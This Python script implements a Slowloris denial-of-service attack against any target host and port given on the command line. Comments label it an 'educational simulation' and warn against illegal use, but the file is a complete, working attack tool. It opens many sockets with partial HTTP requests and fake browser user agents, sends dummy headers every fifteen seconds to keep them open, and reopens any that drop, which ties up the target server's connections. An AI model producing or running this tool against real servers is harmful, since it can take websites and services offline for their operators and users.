import socket
import random
import time
import argparse
import sys

# Educational Slowloris Simulation
# This script illustrates the mechanism of a Slowloris DoS attack.
# DO NOT USE ILLEGALLY.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((ip, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        ua = random.choice(USER_AGENTS)
        s.send(f"User-Agent: {ua}\r\n".encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s
    except socket.error:
        return None

def main():
    parser = argparse.ArgumentParser(description="Slowloris Educational Simulation")
    parser.add_argument("host", help="Target host IP or domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Number of sockets to use (default: 150)")
    args = parser.parse_args()

    ip = args.host
    port = args.port
    socket_count = args.sockets

    print(f"[*] Starting Slowloris simulation on {ip}:{port} with {socket_count} sockets", flush=True)
    
    list_of_sockets = []
    
    # Initial socket creation
    for i in range(socket_count):
        s = init_socket(ip, port)
        if s:
            list_of_sockets.append(s)
            if i % 10 == 0:
                print(f"[*] Created {len(list_of_sockets)} sockets...", flush=True)
        else:
            print(f"[!] Failed to connect. Is the server up?", flush=True)
            break

    while True:
        print(f"[*] Sending keep-alive headers... Socket count: {len(list_of_sockets)}", flush=True)
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)

        # Refill sockets if some were closed
        for _ in range(socket_count - len(list_of_sockets)):
            print("[*] Reopening closed socket...", flush=True)
            s = init_socket(ip, port)
            if s:
                list_of_sockets.append(s)
            else:
                break
        
        time.sleep(15)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Stopping simulation...")
        sys.exit()
